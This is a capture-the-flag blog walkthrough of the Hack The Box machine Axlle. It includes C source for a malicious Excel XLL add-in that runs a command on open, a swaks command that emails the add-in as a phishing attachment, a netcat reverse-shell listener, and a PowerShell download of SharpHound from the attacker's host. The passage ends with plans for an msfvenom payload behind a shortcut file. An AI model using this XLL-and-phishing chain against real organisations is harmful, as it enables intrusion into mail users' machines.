<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Axlle (Windows Hard) | SidePieceVillage</title><meta name="author" content="Jay"><meta name="copyright" content="Jay"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content=" Axlle is a hard-level Windows machine that begins with a website running on port 80. The site displays a maintenance message but mentions that..."><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Axlle (Windows Hard)",
  "url": "https://d34db33fb04h.github.io/2025/06/24/Axlle/",
  "image": "https://d34db33fb04h.github.io/img/axlle.png",
  "datePublished": "2025-06-24T20:29:28.000Z",
  "dateModified": "2025-08-20T18:28:32.404Z",
  "author": [
    {
      "@type": "Person",
      "name": "Jay",
      "url": "https://d34db33fb04h.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/j-neon-oval.png"><link rel="canonical" href="https://d34db33fb04h.github.io/2025/06/24/Axlle/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"No results found for: ${query}","hits_stats":"${hits} articles found"}},
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: true,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Axlle (Windows Hard)',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><script>window.paceOptions = {
  restartOnPushState: false
}

btf.addGlobalFn('pjaxSend', () => {
  Pace.restart()
}, 'pace_restart')

</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js/themes/blue/pace-theme-minimal.min.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/hacking-crook.gif" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">55</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">3</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/whoami/"><i class="fa-fw fas fa-user"></i><span> whoami</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> Categories</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/htb/"><i class="fa-fw fa-solid fa-cube"></i><span> HTB</span></a></li><li><a class="site-page child" href="/categories/vl/"><i class="fa-fw fas fa-building"></i><span> Vunlab</span></a></li><li><a class="site-page child" href="/categories/hacksmarter/"><i class="fa-fw fa-solid fa-computer"></i><span> HackSmarter</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> Nav</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/img/n8.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/j-neon-oval.png" alt="Logo"><span class="site-name">SidePieceVillage</span></a><a class="nav-page-title" href="/"><span class="site-name">Axlle (Windows Hard)</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/whoami/"><i class="fa-fw fas fa-user"></i><span> whoami</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> Categories</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/htb/"><i class="fa-fw fa-solid fa-cube"></i><span> HTB</span></a></li><li><a class="site-page child" href="/categories/vl/"><i class="fa-fw fas fa-building"></i><span> Vunlab</span></a></li><li><a class="site-page child" href="/categories/hacksmarter/"><i class="fa-fw fa-solid fa-computer"></i><span> HackSmarter</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> Nav</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Axlle (Windows Hard)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-06-24T20:29:28.000Z" title="Created 2025-06-24 15:29:28">2025-06-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-08-20T18:28:32.404Z" title="Updated 2025-08-20 13:28:32">2025-08-20</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/htb/">htb</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p><img src="/img/axlle.png"></p>
<p>Axlle is a hard-level Windows machine that begins with a website running on port 80. The site displays a maintenance message but mentions that Excel invoices can still be sent via email for processing.</p>
<p>An attacker exploits this by crafting a malicious .XLL file, which bypasses security checks and is used in a phishing attack. Once the attacker gains code execution on the machine, they create a malicious .url file. This file is executed by the user dallon.matrix, leading to the compromise of their account.</p>
<p>The dallon.matrix user is part of a group that has the ability to change the password of another user, jacob.greeny. The attacker leverages this privilege to reset the password and authenticate as jacob.greeny via WinRM.</p>
<p>The jacob.greeny user is a member of the App Devs group, which has access to a scheduled automation that runs the StandaloneRunner binary with SYSTEM privileges. The attacker exploits this automated task to escalate privileges and ultimately gain a shell as the Administrator.</p>
<h2 id="Intial-Nmap"><a href="#Intial-Nmap" class="headerlink" title="Intial Nmap"></a>Intial Nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       REASON          VERSION</span><br><span class="line">25/tcp    open  smtp          syn-ack ttl 127 hMailServer smtpd</span><br><span class="line">| smtp-commands: MAINFRAME, SIZE 20480000, AUTH LOGIN, HELP</span><br><span class="line">|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY</span><br><span class="line">53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus</span><br><span class="line">80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-favicon: Unknown favicon MD5: FAF2C069F86E802FD21BF15DC8EDD2DC</span><br><span class="line">| http-methods:</span><br><span class="line">|   Supported Methods: OPTIONS TRACE GET HEAD POST</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-title: Axlle Development</span><br><span class="line">88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-06-24 20:33:49Z)</span><br><span class="line">135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: axlle.htb0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds? syn-ack ttl 127</span><br><span class="line">464/tcp   open  kpasswd5?     syn-ack ttl 127</span><br><span class="line">593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped    syn-ack ttl 127</span><br><span class="line">3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: axlle.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  tcpwrapped    syn-ack ttl 127</span><br><span class="line">5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing</span><br><span class="line">49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">64934/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">64936/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">64937/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">64944/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">64948/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">64956/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br></pre></td></tr></table></figure>

<p>From our scan we see of the bat port <code>25/smtp</code> running and we have port <code>80/http</code> open as well. We can check that out first.</p>
<h2 id="Http-for-me"><a href="#Http-for-me" class="headerlink" title="Http for me"></a>Http for me</h2><p>Looking over the site it seems pretty static. Yet the about seems interesting.</p>
<p><img src="/img/axlle1.png"></p>
<p>Maybe we send a invoiceâ€¦.or 2 ðŸ¤£</p>
<h2 id="Excelling-at-everything"><a href="#Excelling-at-everything" class="headerlink" title="Excelling at everything"></a>Excelling at everything</h2><p>If we have any outstanding invoices we can send them their way in a Excel. Looking more into macros for Excel we come across Excel Add-In. This <a target="_blank" rel="noopener" href="https://unit42.paloaltonetworks.com/excel-add-ins-malicious-xll-files-agent-tesla/">article</a> explains it a bit more in depth, but essentially we can create a <code>xll</code> file, really just a <code>dll</code> and send it as an attachment in a email. This should get us code execution and a foothold on the box.</p>
<p>We can create a simple payload and see if we get a callback, weâ€™ll start with <code>ping</code>:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ping.c</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__declspec(dllexport) <span class="type">short</span> __stdcall <span class="title function_">xlAutoOpen</span><span class="params">()</span> &#123;</span><br><span class="line">    WinExec(<span class="string">&quot;cmd /c ping -n 1 10.10.14.7&quot;</span>, SW_HIDE); <span class="comment">// Replace with payload</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><em>Note</em>: We can compile using Visual Studio (<code>cl.exe</code>) but this is far easier, if we ran into problems then I would pivot to that. Using just the <code>__declspec(dllexport) short __stdcall xlAutoOpen()</code> will export the correct function we need to use for a Excel Add-In. </p>
<p>Then we can compile with <code>x86_64-w64-mingw32-gcc</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">konoha# x86_64-w64-mingw32-gcc ping.c -shared -o ping.xll -s -Os -DUNICODE</span><br></pre></td></tr></table></figure>

<p>We can now setup a little test using <code>tcpdump</code> and using the open <code>25/smtp</code> port we can send a little email using <code>swaks</code>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">konoha# swaks --to accounts@axlle.htb --from jay@axlle.htb --header <span class="string">&quot;Subject: Invoice\!&quot;</span> --body <span class="string">&quot;Take My Money\!&quot;</span> --attach @ping.xll</span><br><span class="line">=== Trying axlle.htb:25...</span><br><span class="line">=== Connected to axlle.htb.</span><br><span class="line">&lt;-  220 MAINFRAME ESMTP</span><br><span class="line"> -&gt; EHLO konoha</span><br><span class="line">&lt;-  250-MAINFRAME</span><br><span class="line">&lt;-  250-SIZE 20480000</span><br><span class="line">&lt;-  250-AUTH LOGIN</span><br><span class="line">&lt;-  250 HELP</span><br><span class="line"> -&gt; MAIL FROM:&lt;jay@axlle.htb&gt;</span><br><span class="line">&lt;-  250 OK</span><br><span class="line"> -&gt; RCPT TO:&lt;accounts@axlle.htb&gt;</span><br><span class="line">&lt;-  250 OK</span><br><span class="line"> -&gt; DATA</span><br><span class="line">&lt;-  354 OK, send.</span><br><span class="line"> -&gt; Date: Tue, 24 Jun 2025 15:59:35 -0500</span><br><span class="line"> -&gt; To: accounts@axlle.htb</span><br><span class="line"> -&gt; From: jay@axlle.htb</span><br><span class="line"> -&gt; Subject: Invoice overdue!</span><br><span class="line"> -&gt; Message-Id: &lt;20250624155935.961242@konoha&gt;</span><br><span class="line"> -&gt; X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/</span><br><span class="line"> -&gt; MIME-Version: 1.0</span><br><span class="line"> -&gt; Content-Type: multipart/mixed; boundary=<span class="string">&quot;----=_MIME_BOUNDARY_000_961242&quot;</span></span><br><span class="line"> -&gt;</span><br><span class="line"> -&gt; ------=_MIME_BOUNDARY_000_961242</span><br><span class="line"> -&gt; Content-Type: text/plain</span><br><span class="line"> -&gt;</span><br><span class="line"> -&gt; Please pay the attached invioce ASAP. It is past due.</span><br><span class="line"> -&gt; ------=_MIME_BOUNDARY_000_961242</span><br><span class="line"> -&gt; Content-Type: application/octet-stream; name=<span class="string">&quot;ping.xll&quot;</span></span><br><span class="line"> -&gt; Content-Description: ping.xll</span><br><span class="line"> -&gt; Content-Disposition: attachment; filename=<span class="string">&quot;ping.xll&quot;</span></span><br><span class="line"> -&gt; Content-Transfer-Encoding: BASE64</span><br><span class="line"> -&gt;</span><br><span class="line"> -&gt; TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line"> -&gt; AAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1v</span><br><span class="line"> -&gt; ZGUuDQ0KJAAAAAAAAABQRQAAZIYKAJUQW2gAAAAAAAAAAPAALiILAgIsABQAAAAWAAAAAgAAMBMA</span><br><span class="line"> -&gt; AAAQAAAAAGRHAwAAAAAQAAAAAgAABAAAAAAAAAAFAAIAAAAAAADAAAAABAAAGJAAAAMAYAEAACAA</span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"> -&gt; QUIT</span><br><span class="line">&lt;-  221 goodbye</span><br><span class="line">=== Connection closed with remote host.</span><br></pre></td></tr></table></figure>

<p>Waiting a minute or two and we get a callback.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">konoha# tcpdump -i tun0 icmp</span><br><span class="line">tcpdump: verbose output suppressed, use -v[v]... <span class="keyword">for</span> full protocol decode</span><br><span class="line">listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes</span><br><span class="line">15:59:47.987219 IP MAINFRAME.axlle.htb &gt; 10.10.14.7: ICMP <span class="built_in">echo</span> request, <span class="built_in">id</span> 1, <span class="built_in">seq</span> 2, length 40</span><br><span class="line">15:59:47.987303 IP 10.10.14.7 &gt; MAINFRAME.axlle.htb: ICMP <span class="built_in">echo</span> reply, <span class="built_in">id</span> 1, <span class="built_in">seq</span> 2, length 40</span><br></pre></td></tr></table></figure>

<h2 id="Phishing-for-entry"><a href="#Phishing-for-entry" class="headerlink" title="Phishing for entry"></a>Phishing for entry</h2><p><img src="/img/bait-fishing.gif"></p>
<p>We can now replace our payload with a powershell(b64) reverse shell and get our shell now. Then after a minute or two.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">konoha# rlwrap -cAr nc -lvnp 443</span><br><span class="line">listening on [any] 443 ...</span><br><span class="line">connect to [10.10.14.7] from (UNKNOWN) [10.10.11.21] 65335</span><br><span class="line"></span><br><span class="line">PS C:\&gt; <span class="built_in">whoami</span></span><br><span class="line">axlle\gideon.hamill</span><br></pre></td></tr></table></figure>

<h2 id="Further-enumeration-required"><a href="#Further-enumeration-required" class="headerlink" title="Further enumeration required"></a>Further enumeration required</h2><p>Now that weâ€™re on the box, we can look around, but first I will get <code>SharpHound.exe</code> on the box and then fire up <code>BloodHoundCE</code>.</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">cd</span> C:\\ProgramData ; <span class="built_in">iwr</span> http://<span class="number">10.10</span>.<span class="number">14.7</span>/SharpHound.exe <span class="literal">-o</span> SH.exe</span><br><span class="line"><span class="built_in">PS</span> C:\ProgramData&gt; .\SH.exe <span class="literal">-c</span> All</span><br></pre></td></tr></table></figure>
<p><em>It may look like itâ€™s not doing anything, give it time to finishâ€¦youâ€™ll see output.</em></p>
<p>After it completes we can transfer it over and browse.</p>
<p>Bloodhound shows us nothing at the moment for our user. We can enumerate manually on the machine with <code>PowerView.ps1</code>and doing this shows that <code>Web Devs</code> have special permissions over 2 users.</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">ObjectDN                : CN=Jacob Greeny,DC=axlle,DC=htb</span><br><span class="line">AceQualifier            : AccessAllowed</span><br><span class="line">ActiveDirectoryRights   : ExtendedRight</span><br><span class="line">ObjectAceType           : User<span class="literal">-Force-Change-Password</span></span><br><span class="line">AceFlags                : ContainerInherit</span><br><span class="line">AceType                 : AccessAllowedObject</span><br><span class="line">InheritanceFlags        : ContainerInherit</span><br><span class="line">SecurityIdentifier      : S<span class="literal">-1-5-21-1005535646-190407494-3473065389-1127</span></span><br><span class="line">IdentityReferenceName   : Web Devs</span><br><span class="line">IdentityReferenceDomain : axlle.htb</span><br><span class="line">IdentityReferenceDN     : CN=Web Devs,CN=Users,DC=axlle,DC=htb</span><br><span class="line">IdentityReferenceClass  : <span class="built_in">group</span></span><br><span class="line"></span><br><span class="line">ObjectDN                : CN=Baz Humphries,DC=axlle,DC=htb</span><br><span class="line">AceQualifier            : AccessAllowed</span><br><span class="line">ActiveDirectoryRights   : ExtendedRight</span><br><span class="line">ObjectAceType           : User<span class="literal">-Force-Change-Password</span></span><br><span class="line">AceFlags                : None</span><br><span class="line">AceType                 : AccessAllowedObject</span><br><span class="line">InheritanceFlags        : None</span><br><span class="line">SecurityIdentifier      : S<span class="literal">-1-5-21-1005535646-190407494-3473065389-1127</span></span><br><span class="line">IdentityReferenceName   : Web Devs</span><br><span class="line">IdentityReferenceDomain : axlle.htb</span><br><span class="line">IdentityReferenceDN     : CN=Web Devs,CN=Users,DC=axlle,DC=htb</span><br></pre></td></tr></table></figure>
<p><img src="/img/goldeneye-boris.gif"><br>So how do we get ourselves into that group???ðŸ¤”ðŸ¤”</p>
<h2 id="I-smell-Mail"><a href="#I-smell-Mail" class="headerlink" title="I smell Mail"></a>I smell Mail</h2><p>We know that the machine is running a mail server so we can check the obvious places for installed programs and alas we find <code>hMailServer</code> in the x86 directory. In that directory lies more data for us.</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Program Files (x86)\hMailServer\Data\axlle.htb&gt; <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Program Files (x86)\hMailServer\Data\axlle.htb</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line"><span class="literal">----</span>                 <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span></span><br><span class="line">d<span class="literal">-----</span>         <span class="number">6</span>/<span class="number">24</span>/<span class="number">2025</span>   <span class="number">2</span>:<span class="number">07</span> PM                accounts</span><br><span class="line">d<span class="literal">-----</span>         <span class="number">6</span>/<span class="number">24</span>/<span class="number">2025</span>   <span class="number">2</span>:<span class="number">07</span> PM                Attachments</span><br><span class="line">d<span class="literal">-----</span>          <span class="number">1</span>/<span class="number">1</span>/<span class="number">2024</span>   <span class="number">6</span>:<span class="number">32</span> AM                dallon.matrix</span><br><span class="line">d<span class="literal">-----</span>         <span class="number">6</span>/<span class="number">24</span>/<span class="number">2025</span>   <span class="number">2</span>:<span class="number">07</span> PM                ReviewedAttachments</span><br></pre></td></tr></table></figure>
<p>And if we look in to dallonâ€™s directory we see an email.</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Program Files (x86)\hMailServer\Data\axlle.htb\dallon.matrix\<span class="number">2</span>F&gt; <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Program Files (x86)\hMailServer\Data\axlle.htb\dallon.matrix\<span class="number">2</span>F</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line"><span class="literal">----</span>                 <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span></span><br><span class="line"><span class="literal">-a----</span>          <span class="number">1</span>/<span class="number">1</span>/<span class="number">2024</span>   <span class="number">6</span>:<span class="number">32</span> AM            <span class="number">997</span> &#123;<span class="number">2</span>F7523BD<span class="literal">-628F-4359-913E-A873FCC59D0F</span>&#125;.eml</span><br></pre></td></tr></table></figure>
<p>This email states the following:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Hi everyone,</span><br><span class="line"></span><br><span class="line">The Web Dev group is doing some development to figure out the best way to automate the checking and addition of URLs into the OSINT portal.</span><br><span class="line"></span><br><span class="line">We ask that you drop any web shortcuts you have into the C:\inetpub\testing folder so we can test the automation.</span><br><span class="line"></span><br><span class="line">Yours in click-worthy URLs,</span><br><span class="line"></span><br><span class="line">The Web Dev Team</span><br></pre></td></tr></table></figure>
<p><img src="/img/bazzinga.gif"></p>
<p>So the <code>C:\inetpub\testing</code> directory is being monitored for web shortcuts. We can perhaps make a malicious shortcut, like with <code>lnk</code> files. Lets create a payload with <code>msfvenom</code> and then place it on the box, then create a web shortcut point to it.</p>
